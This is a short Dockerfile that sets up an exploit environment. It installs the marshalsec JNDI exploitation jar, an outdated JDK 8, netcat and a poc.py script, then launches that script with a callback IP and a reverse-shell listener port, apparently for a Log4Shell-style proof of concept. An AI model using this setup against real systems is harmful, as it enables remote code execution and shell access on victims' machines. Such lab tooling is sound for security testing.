FROM python:3.11-bullseye

WORKDIR /exploit
ADD marshalsec-0.0.3-SNAPSHOT-all.jar /exploit/marshalsec-0.0.3-SNAPSHOT-all.jar
ADD jdk-8u20-linux-x64.tar.gz /exploit
# ADD jdk1.8.0_20  /exploit/jdk1.8.0_20

ADD requirements.txt /exploit/requirements.txt
RUN pip install -r requirements.txt
RUN apt-get update && apt-get install -y netcat
ADD poc.py /exploit/poc.py
ADD initial.sh /exploit/initial.sh
ADD java-updater.sh /exploit/java-updater.sh
RUN chmod +x initial.sh

CMD ["python3", "poc.py", "--userip",  "172.25.0.4", "--webport",  "8000", "--lport", "9001"]
